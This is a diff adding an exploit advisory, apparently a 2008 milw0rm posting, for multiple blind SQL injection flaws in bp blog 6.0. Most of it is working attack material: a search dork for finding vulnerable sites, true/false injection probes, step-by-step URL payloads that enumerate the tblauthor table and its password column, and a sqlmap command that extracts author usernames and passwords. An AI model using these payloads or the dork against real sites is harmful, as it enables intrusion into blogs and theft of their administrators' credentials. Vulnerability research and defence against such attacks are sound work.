@@ -1,0 +1,64 @@
+--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
+--==+              bp blog <= 6.0 Multiple Blind SQL Injection Vulnerability             +==--
+--==+====================================================================================+==--
+                     [+] [JosS] + [Spanish Hackers Team] + [Sys - Project]
+
+[+] Info:
+
+[~] Software: bp blog
+[~] HomePage: http://blog.betaparticle.com/
+[~] Exploit: Blind SQL Injection [High]
+[~] Vuln file: template_permalink.asp
+[~] Vuln file2: template_archives_cat.asp
+
+[~] template_permalink.asp?id=[blind]
+[~] template_archives_cat.asp?cat=[blind]
+
+[~] Bug found by JosS
+[~] Contact: sys-project[at]hotmail.com
+[~] Web: http://www.spanish-hackers.com
+[~] EspSeC & Hack0wn!.
+
+[~] Dork: "Powered by bp blog 6.0"
+
+
+[+] Compression:
+
+[~] True: http://localhost/[path]/template_permalink.asp?id=78 and 1=1
+[~] False: http://localhost/[path]/template_permalink.asp?id=78 and 1=2
+
+[+] Exploding:
+
+[*] Checking table: 
+
+[~] Exploit: http://localhost/[path]/template_permalink.asp?id=78 AND (SELECT Count(*) FROM [TABLE]) >= 0
+[~] Exploit2: http://localhost/[path]/template_permalink.asp?id=78 and exists (select * from [TABLE])
+[~] Example: http://localhost/[path]/template_permalink.asp?id=78 AND (SELECT Count(*) FROM tblauthor) >= 0
+[~] Example2: http://localhost/[path]/template_permalink.asp?id=78 and exists (select * from tblauthor)
+[~] If you don't see any error, it is that table exist.
+
+[*] Checking columns number of table:
+
+[~] Exploit: http://localhost/[path]/template_permalink.asp?id=78 AND (SELECT Count(*) FROM [TABLE]) = [NUMBER]
+[~] Example: http://localhost/[path]/template_permalink.asp?id=78 AND (SELECT Count(*) FROM tblauthor) = 1
+[~] If you don't see any error, the table has 1 columns.
+
+[*] Checking columns of table:
+
+[~] Exploit: http://localhost/[path]/template_permalink.asp?id=78 AND (SELECT Count([COLUMN]) FROM [TABLE]) >= 0
+[~] Example: http://localhost/[path]/template_permalink.asp?id=78 AND (SELECT Count(fldauthorpassword) FROM tblauthor) >= 0
+[~] Example: http://localhost/[path]/template_permalink.asp?id=78 AND (SELECT Count(fldauthorusername) FROM tblauthor) >= 0
+[~] If you don't see any error, the column exists.
+
+[*] User and password:
+
+[~] Exploit: ./sqlmap.py -u "URL" -p rid -a "./txt/user-agents.txt" -v1 --string "text" -e "sql query"
+[~] Example: ./sqlmap.py -u "http://../template_permalink.asp?id=78" -p id -a "./txt/user-agents.txt" -v1 --string "bp   blog" -e "<SELECT concat(fldauthorusername,0x3a,fldauthorpassword) from tblauthor where 1=1>"
+
+
+--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
+--==+                                       JosS                                         +==--
+--==+====================================================================================+==--
+                                       [+] [The End]
+
+# milw0rm.com [2008-05-31]
